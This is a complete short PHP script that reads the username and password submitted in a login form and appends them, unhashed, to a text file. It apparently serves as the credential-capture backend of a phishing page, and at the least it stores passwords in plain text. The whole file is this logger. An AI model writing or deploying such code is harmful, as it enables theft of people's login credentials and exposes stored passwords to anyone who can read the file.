<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    $data = "Username: " . $username . "\nPassword: " . $password . "\n";
    file_put_contents("data.txt", $data, FILE_APPEND);
}
?>
